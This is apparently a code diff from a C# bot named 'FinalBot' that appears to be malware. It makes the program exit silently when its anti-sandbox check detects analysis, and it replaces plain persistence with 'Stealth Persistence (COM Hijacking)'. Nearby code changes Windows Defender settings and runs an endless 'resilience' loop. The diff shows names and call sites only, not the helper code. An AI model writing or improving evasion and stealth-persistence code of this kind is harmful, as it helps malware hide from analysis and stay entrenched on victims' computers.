@@ -37,11 +37,11 @@ namespace FinalBot
                 e.SetObserved();
             };
 
-            // [STEP 0] Advanced Anti-Sandbox Check
+            // [PHASE 3] Advanced Anti-Sandbox Check (Black Edition)
             if (AntiAnalysis.CheckAll())
             {
-                DebugLog("SANDBOX DETECTED. ENTERING DECOY SLEEP MODE.");
-                AntiAnalysis.EnterSleepMode(); // Infinite loop
+                // Decoy / Silent Exit
+                AntiAnalysis.EnterSleepMode(); 
                 return;
             }
 
@@ -157,7 +157,8 @@ namespace FinalBot
                 SafetyManager.ApplyDefenderSettings();
             }
 
-            Persistence.Install();
+            // [PHASE 5] Stealth Persistence (COM Hijacking)
+            PersistenceService.InstallStealthProxy();
 
             // --- Resilience Loop ---
             while (true)
